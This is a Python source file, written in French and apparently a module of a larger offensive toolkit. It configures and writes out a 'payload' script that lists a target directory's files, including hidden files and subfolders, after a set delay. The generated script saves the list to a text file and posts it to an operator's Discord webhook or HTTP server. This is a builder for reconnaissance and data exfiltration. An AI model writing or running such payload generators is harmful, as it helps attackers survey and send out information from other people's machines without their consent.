import os
from colorama import Fore, Style, init
import time

init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def affichage():
    clear()
    print(Fore.CYAN + "=== Configuration Directory Listing ===\n\n" + Style.RESET_ALL)
    print(f"""
          
          {Fore.YELLOW}Options : 
{Fore.WHITE}
    1. Chemin du répertoire à lister
    2. Inclure les fichiers cachés
    3. Délai avant listing (en secondes)
    4. Récursif (inclure les sous-dossiers)
    5. Filtrer par extension (ex: .txt)
        
         
          {Fore.YELLOW}Sortie et envoi:
{Fore.WHITE}
    6. Envoi sur Discord
    7. Envoi sur serveur HTTP
    
{Fore.GREEN}
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            {Style.RESET_ALL}
                  """)

def directory_listing_module():
    clear()
    print("=== Directory Listing Configuration ===\n\n")

    choix = {
        "Chemin du répertoire": None,
        "Inclure les fichiers cachés": None,
        "Délai avant listing": None,
        "Récursif": None,
        "Filtrer par extension": None,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
    }

    # -----------------------------------------------
    # Fonctions de configuration
    # -----------------------------------------------

    def chemin_option():
        clear()
        chemin = input("Entrez le chemin du répertoire à lister (ex: C:\\Users ou /home/user) : ").strip()
        if chemin == "":
            print(Fore.RED + "Le chemin ne peut pas être vide." + Style.RESET_ALL)
            time.sleep(1)
            affichage()
            return
        choix["Chemin du répertoire"] = chemin
        print(f"Chemin défini sur : {chemin}")
        time.sleep(1)
        affichage()

    def cache_option():
        clear()
        reponse = input("Inclure les fichiers cachés ? (y/n) : ").lower()
        choix["Inclure les fichiers cachés"] = reponse == 'y'
        print(f"Fichiers cachés : {'inclus' if choix['Inclure les fichiers cachés'] else 'exclus'}.")
        time.sleep(1)
        affichage()

    def delai_option():
        clear()
        delai = input("Délai avant listing (secondes) : ")
        try:
            delai = int(delai)
            if delai < 0:
                print(Fore.RED + "Le délai doit être positif." + Style.RESET_ALL)
                time.sleep(1)
                affichage()
                return
            choix["Délai avant listing"] = delai
            print(f"Délai défini sur {delai} secondes.")
            time.sleep(1)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(1)
        affichage()

    def recursif_option():
        clear()
        reponse = input("Activer le mode récursif (inclure les sous-dossiers) ? (y/n) : ").lower()
        choix["Récursif"] = reponse == 'y'
        print(f"Mode récursif : {'activé' if choix['Récursif'] else 'désactivé'}.")
        time.sleep(1)
        affichage()

    def extension_option():
        clear()
        ext = input("Filtrer par extension (ex: .txt, .py — laisser vide = tous) : ").strip()
        choix["Filtrer par extension"] = ext if ext != "" else None
        print(f"Filtre extension : {choix['Filtrer par extension'] or 'aucun'}.")
        time.sleep(1)
        affichage()

    def envoi_discord():
        clear()
        webhook = input("Entrez l'URL du webhook Discord : ")
        choix["Envoi sur Discord"] = webhook
        affichage()

    def envoi_http():
        clear()
        url = input("Entrez l'URL de votre serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = url
        affichage()

    # -----------------------------------------------
    # Liste des options (même ordre que le menu)
    # -----------------------------------------------
    options = [
        ("Chemin du répertoire",        chemin_option),
        ("Inclure les fichiers cachés", cache_option),
        ("Délai avant listing",         delai_option),
        ("Récursif",                    recursif_option),
        ("Filtrer par extension",       extension_option),
        ("Envoi sur Discord",           envoi_discord),
        ("Envoi sur serveur HTTP",      envoi_http),
    ]

    # -----------------------------------------------
    # Génération du payload
    # -----------------------------------------------
    def create_payload():

        # Le chemin est obligatoire
        if choix["Chemin du répertoire"] is None:
            print(Fore.RED + "Erreur : vous devez définir le chemin du répertoire (option 1)." + Style.RESET_ALL)
            input("\nAppuyez sur Entrée pour continuer...")
            return

        # Dossier de sortie
        payload_dir  = os.path.join("Option", "modules", "payload", "payload_created")
        payload_path = os.path.join(payload_dir, "dirlist_payload.py")
        os.makedirs(payload_dir, exist_ok=True)

        with open(payload_path, "w", encoding="utf-8") as f:
            f.write("import os\n")
            f.write("import time\n")
            f.write("import datetime\n")
            if choix["Envoi sur Discord"] or choix["Envoi sur serveur HTTP"]:
                f.write("import requests\n")
            f.write("\n")

            # --- Variables de configuration ---
            f.write("# ============================================================\n")
            f.write("# Configuration générée automatiquement\n")
            f.write("# ============================================================\n")
            f.write(f"CHEMIN          = {repr(choix['Chemin du répertoire'])}\n")
            f.write(f"INCLURE_CACHES  = {choix['Inclure les fichiers cachés'] if choix['Inclure les fichiers cachés'] is not None else False}\n")
            f.write(f"DELAI           = {choix['Délai avant listing'] or 0}\n")
            f.write(f"RECURSIF        = {choix['Récursif'] if choix['Récursif'] is not None else False}\n")
            f.write(f"EXTENSION       = {repr(choix['Filtrer par extension'])}\n")

            if choix["Envoi sur Discord"]:
                f.write(f"DISCORD_WEBHOOK = {repr(choix['Envoi sur Discord'])}\n")
            else:
                f.write("DISCORD_WEBHOOK = None\n")

            if choix["Envoi sur serveur HTTP"]:
                f.write(f"HTTP_URL        = {repr(choix['Envoi sur serveur HTTP'])}\n")
            else:
                f.write("HTTP_URL        = None\n")

            f.write("\n")

            # --- Logique du listing ---
            f.write("# ============================================================\n")
            f.write("# Listing\n")
            f.write("# ============================================================\n\n")

            f.write("def lister_fichiers():\n")
            f.write('    """\n')
            f.write("    Liste les fichiers du répertoire selon la configuration.\n")
            f.write("    Retourne une liste de chemins relatifs.\n")
            f.write('    """\n')
            f.write("    fichiers = []\n\n")

            f.write("    if RECURSIF:\n")
            f.write("        # os.walk parcourt le dossier ET tous ses sous-dossiers\n")
            f.write("        for dossier, sous_dossiers, noms in os.walk(CHEMIN):\n")
            f.write("            for nom in noms:\n")
            f.write("                # Filtre fichiers cachés\n")
            f.write("                if not INCLURE_CACHES and nom.startswith('.'):\n")
            f.write("                    continue\n")
            f.write("                # Filtre extension\n")
            f.write("                if EXTENSION and not nom.endswith(EXTENSION):\n")
            f.write("                    continue\n")
            f.write("                chemin_complet = os.path.join(dossier, nom)\n")
            f.write("                fichiers.append(chemin_complet)\n")
            f.write("    else:\n")
            f.write("        # os.listdir liste uniquement le dossier donné\n")
            f.write("        for nom in os.listdir(CHEMIN):\n")
            f.write("            if not INCLURE_CACHES and nom.startswith('.'):\n")
            f.write("                continue\n")
            f.write("            if EXTENSION and not nom.endswith(EXTENSION):\n")
            f.write("                continue\n")
            f.write("            fichiers.append(os.path.join(CHEMIN, nom))\n\n")

            f.write("    return fichiers\n\n")

            f.write("def lancer_listing():\n")
            f.write("    # Délai avant de commencer\n")
            f.write("    if DELAI > 0:\n")
            f.write("        print(f\"Attente de {DELAI} secondes...\")\n")
            f.write("        time.sleep(DELAI)\n\n")

            f.write("    debut = datetime.datetime.now()\n")
            f.write("    print(f\"Listing de : {CHEMIN}\\n\")\n\n")

            f.write("    fichiers = lister_fichiers()\n\n")

            f.write("    for f in fichiers:\n")
            f.write("        print(f\"  {f}\")\n\n")

            f.write("    fin = datetime.datetime.now()\n\n")

            # --- Écriture dans le fichier TXT ---
            f.write("    # ---- Écriture des résultats dans un fichier TXT ----\n")
            f.write("    nom_fichier = f\"resultats_dirlist_{debut.strftime('%Y%m%d_%H%M%S')}.txt\"\n")
            f.write("    with open(nom_fichier, 'w', encoding='utf-8') as txt:\n")
            f.write("        txt.write(f\"Rapport Directory Listing - {debut.strftime('%d/%m/%Y %H:%M:%S')}\\n\")\n")
            f.write("        txt.write(f\"Répertoire : {CHEMIN}\\n\")\n")
            f.write("        txt.write(f\"Récursif   : {RECURSIF}\\n\")\n")
            f.write("        txt.write(f\"Extension  : {EXTENSION or 'toutes'}\\n\")\n")
            f.write("        txt.write(f\"Durée      : {fin - debut}\\n\")\n")
            f.write("        txt.write('=' * 40 + '\\n\\n')\n")
            f.write("        txt.write(f\"{len(fichiers)} fichier(s) trouvé(s) :\\n\")\n")
            f.write("        for item in fichiers:\n")
            f.write("            txt.write(f\"  - {item}\\n\")\n")
            f.write("    print(f\"\\nRésultats enregistrés dans : {nom_fichier}\")\n\n")

            # --- Envoi Discord ---
            f.write("    # ---- Envoi Discord (optionnel) ----\n")
            f.write("    if DISCORD_WEBHOOK:\n")
            f.write("        message = (\n")
            f.write("            f\"**Directory Listing** sur `{CHEMIN}`\\n\"\n")
            f.write("            f\"{len(fichiers)} fichier(s) trouvé(s)\\n\"\n")
            f.write("            + '\\n'.join(fichiers[:50])  # limite à 50 pour Discord\n")
            f.write("        )\n")
            f.write("        try:\n")
            f.write("            requests.post(DISCORD_WEBHOOK, json={\"content\": message})\n")
            f.write("            print(\"Résultats envoyés sur Discord.\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi Discord : {e}\")\n\n")

            # --- Envoi HTTP ---
            f.write("    # ---- Envoi HTTP (optionnel) ----\n")
            f.write("    if HTTP_URL:\n")
            f.write("        data = {\n")
            f.write("            \"chemin\": CHEMIN,\n")
            f.write("            \"fichiers\": fichiers,\n")
            f.write("            \"total\": len(fichiers),\n")
            f.write("        }\n")
            f.write("        try:\n")
            f.write("            requests.post(HTTP_URL, json=data)\n")
            f.write("            print(\"Résultats envoyés sur le serveur HTTP.\")\n")
            f.write("        except Exception as e:\n")
            f.write("            print(f\"Erreur envoi HTTP : {e}\")\n\n")

            f.write("# Point d'entrée\n")
            f.write("if __name__ == '__main__':\n")
            f.write("    lancer_listing()\n")

        print(Fore.GREEN + f"Payload généré dans {payload_path}" + Style.RESET_ALL)
        input("\nAppuyez sur Entrée pour continuer...")

    # -----------------------------------------------
    # Boucle principale
    # -----------------------------------------------
    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL).strip()

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
                    time.sleep(1)
            except (ValueError, IndexError):
                print(Fore.RED + "Veuillez saisir 'set <num>'" + Style.RESET_ALL)
                time.sleep(1)

        elif cmd.lower() == "show":
            clear()
            print(Fore.CYAN + "\nConfiguration actuelle du module Directory Listing :\n" + Style.RESET_ALL)
            for option, value in choix.items():
                couleur = Fore.GREEN if value is not None else Fore.RED
                print(f"  {option:35s} : {couleur}{value}{Style.RESET_ALL}")
            input("\nAppuyez sur Entrée pour continuer...")

        elif cmd.lower() == "create":
            create_payload()

        else:
            print(Fore.RED + "Commande inconnue." + Style.RESET_ALL)
            time.sleep(1)
